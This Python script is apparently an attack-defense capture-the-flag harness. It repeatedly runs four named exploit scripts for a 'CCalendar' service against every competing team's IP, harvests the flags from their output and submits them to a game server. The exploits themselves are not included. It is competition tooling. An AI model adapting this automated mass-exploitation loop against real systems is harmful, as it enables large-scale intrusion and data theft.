#!/usr/bin/env python3

import os
import requests
import re
import asyncio
import json
from random import shuffle
from time import monotonic
from subprocess import Popen, PIPE, DEVNULL
from collections import defaultdict
from collections import deque

TEAM_TOKEN = os.environ['TEAM_TOKEN']
FLAG_SUBMIT_INTERVAL = 15
FLAG_QUEUE = deque()
FLAGS_SEEN = set()
EXPLOITS = [
	'./CCalendar-1-static.py',
	'./CCalendar-1-user-injection.py',
	'./CCalendar-2-memcpy-bof.py',
	'./CCalendar-2-snprintf-retval.py'
]

def get_attack_jobs():
	r = requests.get('http://10.10.0.1:8081/flagIds?service=CCalendar-2')
	data = r.json()['CCalendar-2']
	jobs = defaultdict(list)

	for team_id, flag_ids in data.items():
		for flag_id in flag_ids:
			jobs[int(team_id)].append(flag_id)

	return jobs


def submit_flags(flags):
	return requests.put('http://10.10.0.1:8080/flags', headers={
		'X-Team-Token': TEAM_TOKEN
	}, json=flags).text


async def submit_job():
	while 1:
		while not FLAG_QUEUE:
			await asyncio.sleep(1)

		flags = list(FLAG_QUEUE)
		FLAG_QUEUE.clear()

		print(f'[SUBMIT] Submitting: {flags}')
		result = submit_flags(flags)
		print(f'[SUBMIT] Result: {result}')
		await asyncio.sleep(FLAG_SUBMIT_INTERVAL)


async def team_job(team_id, flag_ids):
	team_ip = f'10.60.{team_id}.1'
	exploits = EXPLOITS[:]
	shuffle(exploits)

	for flag_id in flag_ids:
		for exploit in exploits:
			print(f'[TEAM {team_id}] Attacking {flag_id=} with {exploit=}')

			try:
				proc = Popen([exploit, team_ip, json.dumps(flag_id)], text=True, stdout=PIPE, stderr=DEVNULL)
				deadline = monotonic() + 30

				while proc.poll() is None:
					await asyncio.sleep(0.1)

					if monotonic() > deadline:
						print(f'[TEAM {team_id}] Exploit timed out!')
						proc.kill()
						break
				else:
					out = proc.stdout.read()
					flags = re.findall(r'[A-Z0-9]{31}=', out)
					expl_worked = bool(flags)
					flags = list(filter(lambda f: f not in FLAGS_SEEN, flags))

					if flags:
						print(f'[TEAM {team_id}] Got new flags:', flags)
						FLAGS_SEEN.update(flags)
						FLAG_QUEUE.extend(flags)

					# Avoid next exploit, we got the flag with this one
					if expl_worked:
						break

			except Exception as e:
				print(f'[TEAM {team_id}] Exception: {e}')


async def attack_round():
	jobs = get_attack_jobs()
	tasks = []

	for team_id, flag_ids in jobs.items():
		tasks.append(team_job(team_id, flag_ids))

	await asyncio.gather(*tasks)


async def main():
	# Keep a ref to the task so it doesn't get GC'd (according to Python docs)
	x = asyncio.ensure_future(submit_job())

	while True:
		await attack_round()


if __name__ == '__main__':
	asyncio.run(main())
